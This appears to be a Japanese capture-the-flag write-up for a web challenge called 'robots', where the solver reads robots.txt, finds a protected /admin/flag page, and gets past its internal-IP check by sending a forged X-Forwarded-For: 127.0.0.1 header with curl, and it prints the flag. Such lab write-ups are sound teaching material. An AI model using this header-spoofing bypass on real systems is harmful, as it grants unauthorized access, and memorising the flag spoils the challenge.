# robots:web:404pts
Flagが漏洩してるって聞いたけど、本当ですか？？？  

[http://34.82.208.2:31481/](http://34.82.208.2:31481/)  

Hint  
- "robots ctf"で調べてみましょう  
- どうにかして、プログラムを勘違いさせることはできないでしょうか？  

# Solution
URLが渡されるのでアクセスする。  
![116120116.png](site/116120116.png)  
robotsが`116 120 116`と喋っている(task画伯作か？)。  
これはASCIIの`txt`を表しているので、`robots.txt`を確認する。  
```bash
$ curl http://34.82.208.2:31481/robots.txt
User-Agent: *
Disallow: /admin/flag
```
`/admin/flag`があるようなのでアクセスする。  
```bash
$ curl http://34.82.208.2:31481/admin/flag
<html>
~~~
<body>
    <div class="container">
        <h1>401 Unauthorized</h1>
        <p>■■■.■■■.■■■.■■■ is not internal IP address :(</p>
    </div>
</body>

</html>
```
`internal IP address`でなければいけないようだ。  
SSRF系が行える個所はないので、`X-Forwarded-For`とあたりを付ける。  
```bash
$ curl http://34.82.208.2:31481/admin/flag -H "X-Forwarded-For: 127.0.0.1"
<html>
~~~
<body>
    <div class="container">
        <h1>flag</h1>
        <p>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}</p>
    </div>
</body>

</html>
```
`127.0.0.1`に設定するとflagが得られた。  

## taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}